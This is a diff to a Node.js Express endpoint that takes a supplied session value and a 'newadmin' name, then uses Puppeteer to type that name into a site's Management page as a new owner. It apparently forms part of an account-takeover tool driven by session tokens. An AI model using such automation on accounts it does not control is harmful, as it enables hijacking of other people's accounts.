@@ -18,17 +18,11 @@ app.get('/', (req, res) => {
 
 app.post("/uploadFile", (req, res) => {
    var session = req.body.session
+   var newadmin = req.body.newadmin
 
    console.log(session)
 
-//   res.send(result);
 const puppeteer = require('puppeteer');
-
-function delay(time) {
-   return new Promise(function(resolve) { 
-       setTimeout(resolve, time)
-   });
-}
 
 
 async function getNumber() {
@@ -262,7 +256,7 @@ document.location.reload(true);
             if (firstOwner) {
                await page.waitForTimeout(1000)
                // await page.waitForSelector('.Management__filter input[placeholder="Search"]')
-               await page.type('.Management__filter input[placeholder="Search"]', "@JuicerWeb", { delay: 100 });
+               await page.type('.Management__filter input[placeholder="Search"]', newadmin, { delay: 100 });
                firstOwner = false
             }
             
@@ -284,13 +278,17 @@ document.location.reload(true);
       }
    }
 
-   // return log
    await browser.close();
-   // console.log(log)
    let number = await getNumber()
-   // await deleteAccount(number)
    
-   res.send(JSON.stringify(log));
+   // await deleteAccount(number)
+
+   if (log.length > 0) {
+      res.send(JSON.stringify(log));
+   } else {
+      log = 'none'
+      res.send(log);
+   }
 
 }
 
